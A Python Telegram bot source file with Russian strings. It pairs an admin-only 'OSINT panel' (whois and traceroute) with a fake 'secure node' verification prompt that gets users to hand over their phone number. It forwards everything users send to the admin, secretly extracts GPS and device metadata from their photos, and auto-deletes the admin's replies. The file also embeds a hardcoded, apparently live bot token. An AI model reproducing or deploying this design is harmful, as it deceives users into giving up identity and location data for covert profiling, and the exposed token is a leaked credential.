import telebot
from telebot import types
import re, time, threading, io, os, html, subprocess
from PIL import Image
from PIL.ExifTags import TAGS

# --- CONFIG ---
API_TOKEN = '8675147803:AAF51zmP-B0uMxUHfpCvzAWqMNmajuQXPpo'
bot = telebot.TeleBot(API_TOKEN, parse_mode='HTML')
ADMIN_ID = 8502253485
BLACK_LIST_FILE = "blacklist.txt"

# --- СИСТЕМНЫЕ ФУНКЦИИ ---
def get_blacklist():
    if not os.path.exists(BLACK_LIST_FILE): return []
    with open(BLACK_LIST_FILE, "r") as f: return [line.strip() for line in f]

def add_to_blacklist(uid):
    with open(BLACK_LIST_FILE, "a") as f: f.write(f"{uid}\n")

def remove_from_blacklist(uid):
    ids = get_blacklist()
    if str(uid) in ids:
        ids.remove(str(uid))
        with open(BLACK_LIST_FILE, "w") as f:
            for i in ids: f.write(f"{i}\n")
        return True
    return False

def delete_later(chat_id, message_id, delay=3600):
    def s_delete():
        time.sleep(delay)
        try: bot.delete_message(chat_id, message_id)
        except: pass
    threading.Thread(target=s_delete, daemon=True).start()

def build_report(user, label, extra="", phone=None):
    safe_name = html.escape(user.first_name or 'unknown')
    safe_user = f"@{user.username}" if user.username else "unknown"
    phone_display = f"<code>+{phone}</code>" if phone else "<i>unknown</i>"
    
    return (f"<b>{label}</b>\n────────────────────────\n"
            f"<b>Name:</b> <code>{safe_name}</code>\n"
            f"<b>User:</b> <code>{safe_user}</code>\n"
            f"<b>ID:</b> <code>{user.id}</code>\n"
            f"<b>Phone:</b> {phone_display}\n"
            f"────────────────────────\n"
            f"{extra}\n────────────────────────\n<b>Date: </b><code>{time.asctime()}</code>")

# --- OSINT ФУНКЦИИ ---
def analyze_exif(file_bytes):
    try:
        img = Image.open(io.BytesIO(file_bytes))
        exif = img._getexif()
        if not exif: return "EXIF: Clean"
        meta = [f"{TAGS.get(t,t)}: {v}" for t,v in exif.items() if TAGS.get(t) in ['Model', 'Software', 'DateTime', 'GPSInfo']]
        return "EXIF: " + (", ".join(meta) if meta else "No target tags")
    except: return "EXIF: Not supported"

def get_osint_info(target):
    try:
        if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", target):
            out = subprocess.check_output(["whois", target], timeout=10).decode('utf-8', errors='ignore')
            net = re.search(r"netname:\s+(.*)", out, re.I)
            cc = re.search(r"country:\s+(.*)", out, re.I)
            return f"🌐 <b>IP: {target}</b>\nNet: <code>{net.group(1).strip() if net else 'N/A'}</code>\nCC: <code>{cc.group(1).strip() if cc else 'N/A'}</code>"
        import whois
        w = whois.whois(target)
        return f"🔍 <b>WHOIS: {target}</b>\nORG: <code>{w.org}</code>\nREG: <code>{w.registrar}</code>"
    except Exception as e: return f"❌ Error: {str(e)}"

# --- HANDLERS ---

@bot.message_handler(commands=['help'])
def help_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    bot.send_message(ADMIN_ID, "<b>🛠 OSINT PANEL</b>\n\n"
                               "<code>/ip 1.1.1.1</code> — Whois IP\n"
                               "<code>/whois site.com</code> — Whois Domain\n"
                               "<code>/tr 8.8.8.8</code> — Traceroute\n"
                               "<code>/ban ID</code> | <code>/dban ID</code>\n"
                               "────────────────────────\n"
                               "<i>Ответ: Reply на сообщение юзера.</i>")

@bot.message_handler(commands=['ip', 'whois', 'tr'])
def osint_handler(message):
    if message.from_user.id != ADMIN_ID: return
    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "Укажите цель.")
    target = parts[1]
    m = bot.reply_to(message, "⏳ Обработка...")
    if '/tr' in message.text:
        try:
            res = subprocess.check_output(["traceroute", "-m", "15", target]).decode('utf-8')
            bot.edit_message_text(f"🛰 <b>TRACEROUTE:</b>\n<pre>{html.escape(res)}</pre>", message.chat.id, m.message_id)
        except: bot.edit_message_text("❌ Ошибка TR.", message.chat.id, m.message_id)
    else:
        bot.edit_message_text(get_osint_info(target), message.chat.id, m.message_id)

@bot.message_handler(commands=['ban', 'dban'])
def ban_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    parts = message.text.split()
    if len(parts) < 2: return
    target = parts[1]
    if 'dban' in message.text:
        if remove_from_blacklist(target): bot.reply_to(message, f"✅ ID {target} разбанен.")
    else:
        add_to_blacklist(target); bot.reply_to(message, f"⛔️ ID {target} в бане.")

@bot.message_handler(content_types=['text', 'photo', 'contact', 'voice', 'video_note', 'document', 'video', 'audio'])
def master_handler(message):
    uid = message.from_user.id
    if str(uid) in get_blacklist(): return

    # Ответ админа
    if uid == ADMIN_ID and message.reply_to_message:
        try:
            cap = message.reply_to_message.caption or message.reply_to_message.text
            tid = int(re.search(r'ID: (\d+)', cap).group(1))
            sent = bot.send_message(tid, f"✉️ <b>ОТВЕТ АНАЛИТИКА:</b>\n{message.text}")
            delete_later(tid, sent.message_id)
            bot.send_message(ADMIN_ID, f"✅ Отправлено объекту {tid}.")
        except: bot.send_message(ADMIN_ID, "❌ Ошибка: не найден ID.")
        return
    if uid == ADMIN_ID: return

    user = message.from_user
    
    if message.content_type == 'contact':
        bot.send_message(ADMIN_ID, build_report(user, "🚨 ВЕРИФИКАЦИЯ", phone=message.contact.phone_number))
    
    elif message.content_type == 'photo':
        fi = bot.get_file(message.photo[-1].file_id)
        ex = analyze_exif(bot.download_file(fi.file_path))
        bot.send_photo(ADMIN_ID, message.photo[-1].file_id, caption=build_report(user, "📸 ФОТО", ex))
        
    elif message.content_type == 'text':
        bot.send_message(ADMIN_ID, build_report(user, "📩 ТЕКСТ", f"Text: {html.escape(message.text)}"))

    else:
        bot.send_message(ADMIN_ID, build_report(user, "📎 МЕДИА", f"Type: {message.content_type}"))

    bot.reply_to(message, "✅ <b>Сигнал получен.</b>")

@bot.message_handler(commands=['start'])
def start_cmd(message):
    if str(message.from_user.id) in get_blacklist(): return
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(types.KeyboardButton("🛡 Пройти верификацию", request_contact=True))
    bot.send_message(message.chat.id, "<b>[ SECURE NODE ]</b>\nЖду сигнал...", reply_markup=markup)

if __name__ == '__main__':
    bot.polling(none_stop=True)
